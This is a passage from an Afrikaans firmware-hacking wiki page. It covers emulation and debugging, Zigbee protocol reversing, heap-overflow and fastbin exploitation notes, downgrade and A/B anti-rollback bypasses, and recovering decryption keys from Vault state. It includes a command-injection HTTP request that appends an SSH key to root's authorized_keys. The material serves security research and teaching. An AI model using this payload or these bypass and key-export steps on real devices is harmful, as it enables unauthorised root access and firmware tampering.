Wanneer die ontleder beheer het oor die QEMU-kernel, initramfs en virtuele skywe, kan ’n gewysigde root selflaai deur die verkoper se verifikasie-PID 1 met ’n klein staties gekoppelde init te vervang. Dit is ’n **vervanging van die selflaaiketting in ’n laboratorium**, nie ’n breuk van dm-verity, die RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[11]](#references)</sup>

Die vervangende init moet die operasionele dele van die oorspronklike selflaaipad naboots: monteer `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywers 0–2, monteer `/proc` en `/sys`, wag vir die verskafte bloktoestel, monteer die gewysigde root leesalleen, ontkoppel die pseudo-lêerstelsels van die ou root, skuif die nuwe mount na `/`, roep `chroot` aan en voer die firmware se oorspronklike `/sbin/init` met `execve()` uit. Deur `/dev`, `/proc` en `/sys` **voor** `MS_MOVE` te ontkoppel, voorkom jy dat mountpunte wat aan die nuwe root behoort, per ongeluk ontkoppel word.<sup>[[11]](#references)</sup>

Hou veranderbare toesteltoestand apart van die gewysigde onveranderlike root. ’n qcow2-overlay kan die oorspronklike skyf se LVM-toestand behou, terwyl ’n tweede leesalleen virtio-skyf die gewysigde SquashFS voorsien:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Ontfouting van beeldtoestand vanlyn

Inspekteer volgehoue toestand buite die guest wanneer stadige selflaaie, vernietigende opstartscripts of onbetroubare konsole-aanmelding die fout verbloem. Moet nooit ’n oorlaag koppel wat ’n lopende VM gebruik nie; maak dit beskikbaar met `qemu-nbd`, beperk LVM-ontdekking tot die bedoelde NBD-partisie en deaktiveer die volumegroep voordat jy dit ontkoppel.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolasie, skryf tydstempelmerkerlêers na ’n stabiele skryfbare volume en verifieer dit vanlyn; `/dev/kmsg`, FIFOs en tydelike konsoles kan vals negatiewe resultate oplewer weens koersbeperking of voortydige prosesbeëindiging. Vergelyk ook die presiese koppelvlakke oor lae heen voordat jy onverwante kode verander: `uname -r` teenoor `/lib/modules/`, ext4-kenmerke op skyf teenoor die kernkonfigurasie, en die Mesa `libGL`-generasie teenoor die DRI-bestuurder-ABI en PCI-afgeleide bestuurdername. ’n Komponent kan bestaan en selfs suksesvol met `dlopen()` gelaai word, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[11]](#references)</sup>

## Dinamiese analise in die praktyk

Op hierdie stadium word ’n werklike of geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots moontlik nie hardeware-interaksies perfek na nie, wat dit soms nodig maak om die emulasie te herbegin. Analise moet die lêerstelsel weer ondersoek, blootgestelde webblaaie en netwerkdienste uitbuit, en kwesbaarhede in die bootloader verken. Firmware-integriteitstoetse is noodsaaklik om moontlike backdoor-kwesbaarhede te identifiseer.

## Tegnieke vir runtime-analise

Runtime-analise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing, met behulp van nutsmiddels soos gdb-multiarch, Frida en Ghidra om breekpunte te stel en kwesbaarhede met fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige debugger, **kopieer ’n staties gekoppelde `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-ko-prosessor-boodskapkartering

Op IoT-hubs word die RF-stapel dikwels tussen ’n **radio-MCU** en ’n Linux-userland-proses verdeel. ’n Nuttige werksvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** oor die lug
2. **Beheerderkantontleder** op die radio-MCU
3. **Seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **Toepassingsdispatcher** in die hoofdemon
5. **Protokolspesifieke hanteerder / toestandsmasjien**

Hierdie argitektuur skep twee omgekeerde-ingenieurswese-teikens in plaas van een. As die beheerder binêre radiogr ame na ’n teksprotokol soos `Group,Command,arg1,arg2,...` omskakel, herwin:

- Die **boodskapgroepe** en dispatch-tabelle
- Watter boodskappe van die **netwerk** kan kom teenoor die beheerder self
- Die presiese **vervaardigerspesifieke diskriminatorvelde** (byvoorbeeld Zigbee `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter hanteerders slegs tydens **inbedryfstelling**, ontdekking of firmware-/modelaflaaifases bereikbaar is

Vir Zigbee spesifiek, neem paringverkeer vas en kyk of die teiken steeds op die verstek-**Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan die afluistering van inbedryfstellingverkeer die **Network Key** blootlê. Zigbee 3.0-installasiekodes verminder hierdie blootstelling, dus let op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokolhanteerders en FSM-beheerde bereikbaarheid

Verskafferspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’e** voed met minder deeglik getoetste validering.<sup>[[8]](#references)</sup>

Praktiese werksvloei:

- Keer die opdragdispatcher om totdat jy die **slegs-verskaffer-hanteerder** vind.
- Herwin die **FSM-toestand**-, **gebeurtenis**-, **kontrole**-, **aksie**- en **volgende-toestand**-tabelle.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, en herprobeer-/foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter wettige protokoluitruilings nodig is om die demon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe hanteerder altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketherhaling vanuit ’n Python-raamwerk te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op regte hardeware (byvoorbeeld ’n **nRF52840**) met ’n verskaffergraad-stapel na te boots, sodat jy die korrekte **eindpunte**, **eienskappe** en tydsberekening van inbedryfstelling kan blootlê.

### Foutklas vir gefragmenteerde aflaaie in ingebedde daemons

’n Herhalende firmwarefoutklas kom voor in **gefragmenteerde blob-/model-/konfigurasie-aflaaie**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakketplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **oorspronklik toegekende grootte** te kontroleer.

Dit stel ’n aanvaller in staat om:

- ’n Eerste geldige fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakketplaaslike grootte te gebruik wat aan die nuwe kontroles voldoen, terwyl dit steeds die oorspronklik toegekende buffer oorloop.

Wanneer die kwesbare pad agter inbedryfstellingslogika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blobaflaaitoestand te plaas voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde daemons is die maklikste manier om heap-metadata-uitbuiting te aktiveer dikwels nie om “vir opruiming te wag” nie, maar om **die protokol se eie fouthantering af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **herprobeer-** of **fouttoestande** te stuur.
- Oorskry die herprobeerdrempel sodat die demon die **konteks terugstel** en die beskadigde buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om toewyserkant-primitiewe te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** toewysers in ingebedde Linux, waar beskadiging van chunk-metadata unlink/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te beskadig om toewysernavigasie na **vals chunks wat binne die oorloopbuffer geplaas is** te herlei, eerder as om werklike bin-aanwysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binêre uitbuiting en Proof-of-Concept

Die ontwikkeling van ’n PoC vir geïdentifiseerde kwesbaarhede vereis ’n diep begrip van die teikenargitektuur en programmering in laervlaktale. Binêre looptydbeskermings in ingebedde stelsels is skaars, maar wanneer hulle voorkom, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc fastbin-uitbuitingsnotas (ingebedde Linux)

- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals chunk kontroles slaag (gesonde grootte, `fd = 0` en omliggende chunks wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binêre lêers onder ASLR:** as ASLR geaktiveer is maar die hoofbinêre lêer **nie-PIE** is, is adresse in-binêr `.data/.bss` stabiel. Jy kan ’n gebied teiken wat reeds soos ’n geldige heap-chunk-kopskrif lyk, om ’n fastbin-toekenning op ’n **funksiewysertabel** te laat beland.
- **NUL wat die ontleder laat stop:** wanneer JSON ontleed word, kan ’n `\x00` in die loonvrag die ontleding stop terwyl daaropvolgende aanvallerbeheerde grepe behoue bly vir ’n stapeloorgang/ROP-ketting.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende geheuekartering plaas en daarnaartoe spring.

## Voorbereide bedryfstelsels vir firmware-ontleding

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf opgestelde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige gereedskap.

## Voorbereide OS’e om firmware te ontleed

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n verspreiding wat bedoel is om jou te help met sekuriteitsassessering en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit bespaar jou baie tyd deur ’n vooraf opgestelde omgewing met al die nodige gereedskap te voorsien.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met firmware-sekuriteitstoetsingsgereedskap.

## Firmware-terugdraai-aanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n verskaffer kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **weergawe-terugdraaibeskerming (downgrade)** dikwels weggelaat. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geflits word, vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware installeer wat steeds ’n geldige handtekening dra** en so reggemaakte kwesbaarhede weer bekendstel.<sup>[[4]](#references)</sup>

Tipiese aanvalswerksvloei:

1. **Verkry ’n ouer, ondertekende beeld**
   * Kry dit vanaf die verskaffer se openbare aflaaiportaal, CDN of ondersteuningswebwerf.
   * Onttrek dit uit gepaardgaande mobiele-/rekenaartoepassings (bv. binne ’n Android APK onder `assets/firmware/`).
   * Verkry dit uit derdeparty-bewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld op na of bedien dit aan die toestel** via enige blootgestelde opdateringskanaal:
   * Web-UI, mobieletoepassing-API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikers bied *ongeverifieerde* HTTP(S)-eindpunte wat Base64-geënkodeerde firmwareblobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Nadat die firmware teruggerol is, buit ’n kwesbaarheid uit wat in die nuwer weergawe reggemaak is (byvoorbeeld ’n opdraginspuitingsfilter wat later bygevoeg is).
4. Opsioneel, flits die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy sodra volharding verkry is.

### Voorbeeld: Opdraginspuiting ná terugrol

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk sonder sanitisering by ’n shell-opdrag gevoeg, wat inspuiting van arbitrêre opdragte moontlik maak (hier gebruik om SSH-sleutelgebaseerde root-toegang te aktiveer). Latere firmware-weergawes het ’n basiese karakterfilter ingebou, maar omdat daar geen beskerming teen afgradering is nie, is die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Onttrekking van firmware uit mobiele toepassings

Baie verskaffers sluit volledige firmware-beelde in hul gepaardgaande mobiele toepassings in, sodat die app die toestel via Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Met nutsprogramme soos `apktool`, `ghidra` of selfs gewone `unzip` kan jy getekende beelde onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Anti-rollback-omseiling wat net in die updater werk in A/B-slotontwerpe

Sommige verskaffers implementeer wel ’n **anti-downgrade-ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n herstelopdrag of ’n gebruikersruimte-OTA-agent). As die **bootloader** later slegs die image se handtekening/CRC nagaan en die partisietabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmware-metadata bevat sowel ’n weergawebeskrywing as ’n **sekuriteitsratchet** / monotone teller.
- Die updater vergelyk die image se ratchet met ’n waarde wat in aanhoudende berging gestoor is en verwerp ouer ondertekende images.
- Die bootloader ontleed nie daardie ratchet nie en verifieer slegs die kopskrif, CRC en handtekening voordat dit vanaf die geselekteerde slot begin.
- Slotaktivering word afsonderlik in ’n partisietabel of generasieteller per slot gestoor en is nie kriptografies gekoppel aan die presiese firmware-digest wat gevalideer is nie.

Dit skep ’n primitief van **valideer-een-image / begin-nog ’n-image** in dubbelslotstelsels. As die aanvaller die updater die slot B kan laat merk as die volgende teiken vir opstart met ’n huidige, ondertekende image, en later slot B kan oorskryf voordat die toestel herbegin, kan die bootloader steeds die afgegradeerde image begin omdat dit slegs die reeds vasgelegde slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige, ondertekende** firmware na die passiewe slot op en voer die normale validerings-/skakelroetine uit sodat die uitleg daardie slot as volgende aktiewe slot merk.
2. **Moenie nog herbegin nie**. Voer die slotvoorbereidings-/uitroetine weer uit in dieselfde sessie.
3. Misbruik verouderde opstarttoestand of verouderde slotkeuselogika sodat die updater dieselfde fisiese slot uitvee wat pas bevorder is.
4. Skryf ’n **ouer, maar steeds ondertekende** firmware na daardie slot.
5. Slaan die valideringsroetine wat die ratchet afdwing oor en herbegin direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs die handtekening/integriteit en begin die ou image.

Dinge waarna jy moet kyk wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Slotkeuse wat afgelei word van **opstartvlae** wat nie ná ’n suksesvolle omskakeling verfris word nie.
- ’n Roetine soos `prepare_passive_slot()` wat ’n slot uitvee op grond van verouderde toestand in plaas van die **huidige, vasgelegde uitleg**.
- ’n Funksie soos `part_write_layout()` wat slegs ’n **generasieteller** / aktiewe vlag verhoog en nie die gevalideerde image-hash stoor nie.
- Ratchet-kontroles wat in gebruikersruimte- of updater-kode geïmplementeer is, maar **nie** in die ROM-/bootloader-/secure-boot-stadiums nie.
- Uitvee- of herstelroetines wat die slot as geskik vir opstart laat gemerk, selfs nadat die inhoud daarvan verwyder en herskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/verifikasie van die *update endpoint* voldoende beskerm (TLS + verifikasie)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit die firmware flits?
* Word die image binne ’n secure boot-ketting geverifieer (bv. handtekeninge word deur ROM-kode nagegaan)?
* Dwing die **bootloader dieselfde ratchet af** as die updater, in plaas daarvan om net die handtekening/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmware-digest/-weergawe**, of kan ’n slot ná bevordering gewysig word?
* Word die toestel gedwing om te herbegin nadat ’n slotskakeling slaag, of kan latere opdaterings-/uitroetines steeds in dieselfde sessie uitgevoer word?
* Voer gebruikerslandkode bykomende gesondeverstand-kontroles uit (bv. toegelate partisiekartering, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde valideringslogika?

> 💡  As enige van bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt om kwesbaarhede in firmware te ontdek.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsimage klein plaintext-metadata met ’n groot blob met hoë entropie meng, doen eers houertriage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Stort kopskrifte, offsets en reëlgrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` beteken gewoonlik OpenSSL `enc`-formaat: die volgende 8 grepe is die salt en die oorblywende grepe is die ciphertext.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmwarewagwoord/sessiesleutel omhul.
- Losstaande PGP-materiaal in dieselfde lêer beskerm dikwels slegs egtheid; moenie aanneem dat dit die vertroulikheidsmeganisme is nie.

As statiese sleuteljag (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripsiepad** as om net na private sleutels te soek:

- Decompileer die updater-/bestuursbinary en spoor na wie die geënkripteerde blob lees, watter helper/API dit ontsluit en watter logiese sleutelnaam daarvoor aangevra word.
- Soek in die onttrekte root-lêerstelsel na KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) asook eenheidlêers en init-skripte.
- Behandel plaintext `vault operator unseal ...`, herstelsleutels, bootstrap-tokens of plaaslike KMS outo-ontseëlingskripte as gelykstaande aan private-sleutelmateriaal.

As die toestel die oorspronklike Vault-binary en bergingbackend insluit, is dit gewoonlik makliker om daardie omgewing te herspeel as om Vault se interne werking te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Toets die herwonne RSA-sleutel met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-decrypt en ’n mislukte verstek-OAEP-decrypt bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloeie gebruik OAEP met SHA-256, terwyl algemene libraries SHA-1 as verstek gebruik.
- As die payload met `Salted__` begin, herhaal die verskaffer se OpenSSL KDF presies (`EVP_BytesToKey`, dikwels MD5 op verouderde toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander “geënkripteerde firmware” in ’n meer algemene probleem: **herwin die toestel se operasionele sleutels, en herhaal dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware kraak met Claude: vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-hacking: Die definitiewe gids tot aanvalle op die Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Uitbuiting van zero days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy mi: Nou is jy Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Uitbuiting van die Tesla Wall Connector via sy laaipoort-koppelstuk - Deel 2: omseiling van die anti-downgrade-beskerming](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Over-the-Air-uitbuiting van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 1: Uitpak](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-kerneldokumentasie - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS-wagwoorde: Swak XOR-enkripsie maak herstel vanaf SPI Flash moontlik (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Gereedskap vir Dell BIOS-wagwoordherstel](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — ’n Opknappingskursus in hardeware-hacking Deel 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Hoe en waarom ons die Cypherock-hardewarebeursie gehack het: Die volledige verhaal](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
